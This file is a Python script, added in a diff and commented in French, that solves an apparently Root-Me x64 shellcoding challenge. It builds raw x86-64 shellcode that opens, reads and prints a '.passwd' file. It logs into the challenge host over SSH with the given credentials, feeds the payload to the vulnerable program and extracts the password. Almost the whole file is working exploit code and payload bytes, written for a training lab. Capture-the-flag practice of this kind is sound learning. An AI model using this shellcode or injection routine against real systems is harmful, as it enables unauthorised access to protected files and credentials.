@@ -1,0 +1,113 @@
+#ELF x64 - Shellcoding - Sheep warmup
+
+#!/usr/bin/env python3
+
+import paramiko
+import time
+import sys
+
+# Informations de connexion
+host = 'challenge01.root-me.org'
+port = 2221
+username = 'programmation-ch12'
+password = 'programmation-ch12'
+
+# Création du shellcode pour lire et afficher le contenu de '.passwd'
+shellcode = (
+    b"\xEB\x07"                    # jmp +7 (saute les bytes écrasés)
+    + b"\x90" * 7                  # 7 NOPs (écrasés par 0xC3)
+    # Le code réel commence ici (offset 9)
+    + b"\x58"                      # pop rax              ; Retirer l'adresse de retour de la pile
+    + b"\x48\x83\xE4\xF0"          # and rsp, 0xfffffffffffffff0 ; Aligner la pile sur 16 octets
+    + b"\x48\x31\xC0"              # xor rax, rax         ; rax = 0
+    + b"\xB0\x02"                  # mov al, 2            ; sys_open
+    + b"\x48\x8D\x3D\x24\x00\x00\x00"  # lea rdi, [rip+0x24] ; Adresse de '.passwd'
+    + b"\x48\x31\xF6"              # xor rsi, rsi         ; rsi = 0 (O_RDONLY)
+    + b"\x0F\x05"                  # syscall              ; Appel système open
+    + b"\x48\x89\xC7"              # mov rdi, rax         ; rdi = fd
+    + b"\x48\x31\xC0"              # xor rax, rax         ; rax = 0
+    + b"\x48\x89\xE6"              # mov rsi, rsp         ; rsi = buffer
+    + b"\xBA\x32\x00\x00\x00"      # mov edx, 50          ; rdx = 50
+    + b"\x0F\x05"                  # syscall              ; Appel système read
+    + b"\x48\x89\xC2"              # mov rdx, rax         ; rdx = nombre de bytes lus
+    + b"\x48\x31\xC0"              # xor rax, rax         ; rax = 0
+    + b"\xB0\x01"                  # mov al, 1            ; sys_write
+    + b"\xBF\x01\x00\x00\x00"      # mov edi, 1           ; rdi = 1 (stdout)
+    + b"\x0F\x05"                  # syscall              ; Appel système write
+    + b".passwd\x00"               # Chaîne '.passwd\0'
+)
+
+# Remplir jusqu'à 80 octets si nécessaire
+payload = shellcode.ljust(80, b'\x90')
+
+try:
+    # Connexion SSH au serveur
+    print("[*] Connexion au serveur...")
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(hostname=host, port=port, username=username, password=password)
+    print("[*] Connecté.")
+
+    # Ouvrir un shell interactif
+    channel = client.invoke_shell()
+    time.sleep(1)  # Attendre que le shell soit prêt
+
+    # Vider le buffer initial
+    while channel.recv_ready():
+        initial_output = channel.recv(1024).decode('utf-8', errors='replace')
+        print(initial_output)
+
+    # Changer de répertoire vers le home
+    print("[*] Changement de répertoire vers le home...")
+    channel.send('cd ~\n')
+    time.sleep(0.5)
+
+    # Exécuter le programme du challenge
+    print("[*] Exécution du programme du challenge...")
+    channel.send('./ch12\n')
+    time.sleep(0.5)
+
+    # Lire la sortie jusqu'à l'invite 'Input shellcode:'
+    output = ''
+    while True:
+        if channel.recv_ready():
+            data = channel.recv(1024).decode('utf-8', errors='replace')
+            output += data
+            print(data, end='')
+            if 'Input shellcode:' in output:
+                break
+        else:
+            time.sleep(0.1)
+
+    # Envoyer le payload
+    print("[*] Envoi du payload...")
+    channel.send(payload + b'\n')
+
+    # Lire la sortie après l'envoi du payload
+    time.sleep(1)
+    output = ''
+    while True:
+        if channel.recv_ready():
+            data = channel.recv(1024)
+            output += data.decode('utf-8', errors='replace')
+        else:
+            break
+
+    # Extraire le mot de passe de la sortie
+    print("[*] Sortie reçue :")
+    print(output)
+
+    # Chercher le mot de passe dans la sortie
+    for line in output.splitlines():
+        if line.strip() and "Erreur de segmentation" not in line:
+            print("[*] Mot de passe trouvé :", line.strip())
+            break
+
+except Exception as e:
+    print(f"Une erreur est survenue : {e}")
+
+finally:
+    if 'channel' in locals() and channel:
+        channel.close()
+    if 'client' in locals() and client:
+        client.close()
